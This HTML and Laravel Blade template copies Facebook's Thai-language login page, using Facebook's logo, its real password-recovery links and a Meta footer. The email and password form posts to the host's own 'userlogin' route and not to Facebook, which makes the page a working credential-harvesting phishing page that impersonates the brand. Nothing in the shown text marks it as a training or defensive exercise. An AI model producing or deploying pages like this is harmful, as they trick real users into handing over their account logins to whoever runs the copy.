<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - เข้าสู่ระบบหรือสมัครใช้งาน</title>
    <link rel="icon" type="image/png" sizes="16x16" href="{{ url('img/icon.png') }}">
    <link rel="stylesheet" href="CSS/login.css">
</head>

<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="" >
                <p>Facebook helps you connect and share</p>
                <p>with the people in your life.</p>
            </div>
            <div class="fom">
                <form action="{{ route('userlogin') }}" method="POST">
                    @csrf
                    <input type="email" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required class="pass">
                    <div class="link">
                        @if(session('error'))
                            <div class="alert alert-danger" style="color: red; text-align: start">
                                {{ session('error') }}
                            </div>
                        @endif
                        <button type="submit" class="login">Log in</button>
                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot">Forgotten password?</a>
                    </div>
                    <hr class="hr">
                    <div class="button">
                        <a href="/register">Create new account</a>
                    </div>
                </form>
                <div class="create">
                    <a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a> for a celebrity, brand or business.
                </div>
            </div>
        </div>
    </div>

    
    <footer>
        <ul>
            <li style="color: black;">English (UK)</li>
            <li>ภาษาไทย</li>
            <li>日本語</li>
            <li>中文(简体)</li>
            <li>Tiếng Việt</li>
            <li>Français (France)</li>
            <li>Deutsch</li>
            <li>Русский</li>
            <li>Español</li>
            <li>Português (Brasil)</li>
            <li>Italiano</li>
        </ul>
        <hr>
        <ul class="des">
            <li>Sign Up</li>
            <li>Log in</li>
            <li>Messenger</li>
            <li>Facebook Lite</li>
            <li>Video</li>
            <li>Places</li>
            <li>Games</li>
            <li>Marketplace</li>
            <li>Meta Pay</li>
            <li>Meta Store</li>
            <li>Meta Quest</li>
            <li>Ray-Ban Meta</li>
            <li>Meta AI</li>
            <li>Instagram</li>
            <li>Threads</li>
            <li>Fundraisers</li>
            <li>Services</li>
            <li>Voting Information Centre</li>
            <li>Privacy Policy</li>
            <li>Privacy Centre</li>
            <li>Groups</li>
            <li>About</li>
            <li>Create ad</li>
            <li>Create Page</li>
            <li>Developers</li>
            <li>Careers</li>
            <li>Cookies</li>
            <li>AdChoices</li>
            <li>Terms</li>
            <li>Help</li>
            <li>Contact uploading and non-users</li>
            <li></li>
            <li></li>
            <li></li>
        </ul>
        <br>
        <p style="color: black;">Meta © 2024</p>
        <br>
    </footer>
</body>

</html>
static.xx.fbcdn.net